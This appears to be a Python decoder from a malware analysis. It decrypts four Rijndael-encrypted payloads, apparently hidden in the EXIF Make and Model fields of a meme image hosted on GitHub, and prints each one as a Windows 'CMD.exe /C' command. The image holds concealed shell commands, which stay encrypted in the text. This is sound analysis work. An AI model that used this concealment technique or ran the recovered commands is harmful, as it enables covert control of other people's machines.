#!/usr/bin/python3

from base64 import b64decode
from hashlib import pbkdf2_hmac
# http://github.com/meyt/py3rijndael - AES can't do 32-byte blocks
from py3rijndael import RijndaelCbc, Pkcs7Padding

# wget https://raw.githubusercontent.com/00xNULL/meme_review/main/meme.jpg
# exiftool meme.jpg

for (exif_make, exif_model) in [
        ("WkpYd3hoQUlMOFArL01wWGx5cVBkOVRBTi9xMENjbllvUVNxUFBYVGZ1MVMxZ1k5eU1JS2lBTTJWcE0yUmtINUxuK2FtbTkyVUk3RHdZUm8yenVLZUtIUUk3WEYveEZHWC9Hd1M3TXl1R042NVYwZ2NqVHFFSkdpSTJyUFlDSkI=",
         "nanananana_batmaaaaaan"),
        ("bDkxZENDb3B2RkFHS3Y2aHN2L282c3hiM3FEVDQveGhySlR5NXE5RGttWWcyUHkwSG11TExXQkw4ZEcxalcwNlk0SlY4RWNzT1BUMVpUb1BObEIxTXpVNjY2a0lCZUF5OFk1SVA5R2ppYWpraVVHMTVQL3puYW5MSGlCdVQyK3o=",
         "lasagne"),
        ("TVAwRHIwcGNkZmhZajJmek1kUWUvWjZWcE5RR283YVVESEMzRERtb0cxWHZXSG0vN1BlN2lPSCt3c3d0dHlRSkR2YXF2ZFBYdXBnNzdhK3FWMHFLcXphN05meWRmY3VFZVVnck85TEpSTEErZ0c3eWhLV3cyQk5lTkVPbTh2WDlBZUtTdWNDVVVRQlh1VkM5L0w0dmFsdkpQWGVWQU5ZalgzTHlKSHQ0UjV3PQ==",
         "reeeeeeeeeee"),
        ("YklwRWJKb2Vvelc5ZStIek1sdXJkWmRzeUxwc2x2cVhxSVlZZWRsVzhlT2JaR2FuaWFCTmhsSmtVN1pZUWFCa1FLMkV6eXErRkxSTTVHMnZibXovMlpNTUV0eitab1lLSGkxdGZ6cUpLYXR6OURPdy9GM0FhSDZMZUFKWjB2bGs=",
         "lettuce"),
     ]:

    cipherText = b64decode(exif_make).decode('ascii')
    passPhrase = exif_model

    array = b64decode(cipherText)
    salt = array[0:32]
    rgbIV = array[32:64]
    buffer = array[64:]

    inp = pbkdf2_hmac('sha1', bytes(passPhrase, 'ascii'), salt, 1000, 32)
    text = RijndaelCbc(inp, rgbIV, padding=Pkcs7Padding(32), block_size=32).decrypt(buffer)
    print("CMD.exe /C "+text.decode('ascii')+" && pause")

